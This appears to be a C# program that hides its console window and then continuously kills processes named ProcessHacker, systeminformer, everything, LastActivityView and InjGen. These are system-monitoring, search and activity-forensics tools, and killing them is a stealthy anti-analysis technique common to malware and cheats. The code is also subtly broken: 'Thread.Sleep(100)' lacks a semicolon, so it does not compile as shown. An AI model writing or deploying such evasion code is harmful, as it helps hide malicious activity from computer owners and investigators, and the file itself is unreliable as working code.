using System;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

class Program
{
    // Hide console window
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    static void Main()
    {
        // Hide the console window immediately
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        while (true)
        {
            foreach (var procName in new[] { "ProcessHacker", "systeminformer", "everything","LastActivityView","InjGen" })
            {
                var procs = Process.GetProcessesByName(procName);
                foreach (var proc in procs)
                {
                    try
                    {
                        proc.Kill();
                    }
                    catch { /* ignore failures */ }
                }
            }
            Thread.Sleep(100)
        }
    }
}
